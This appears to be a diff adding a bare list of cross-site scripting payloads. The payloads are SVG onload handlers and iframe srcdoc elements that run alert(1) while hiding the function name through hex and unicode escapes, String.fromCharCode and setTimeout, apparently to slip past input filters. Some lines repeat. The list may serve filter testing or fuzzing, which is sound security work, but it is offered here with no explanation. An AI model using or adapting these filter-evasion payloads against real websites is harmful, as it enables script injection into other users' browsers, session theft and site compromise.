@@ -1,0 +1,10 @@
+<svg onload="this['\x6f\x6eload']=null;window['\x61l\x65rt'](1)">
+<svg onload="window['\x61l\x65rt'](1)">
+<svg onload="window['\u0061l\x65rt'](1)">
+<iframe srcdoc="<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>"></iframe>
+<svg onload="setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)">
+<svg onload="window['\x61l\x65rt'](1)">
+<svg onload="window['\u0061l\x65rt'](1)">
+<iframe srcdoc="<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>"></iframe>
+<svg onload="setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)">
+<svg onload="window['\x61l\x65rt'](1)">
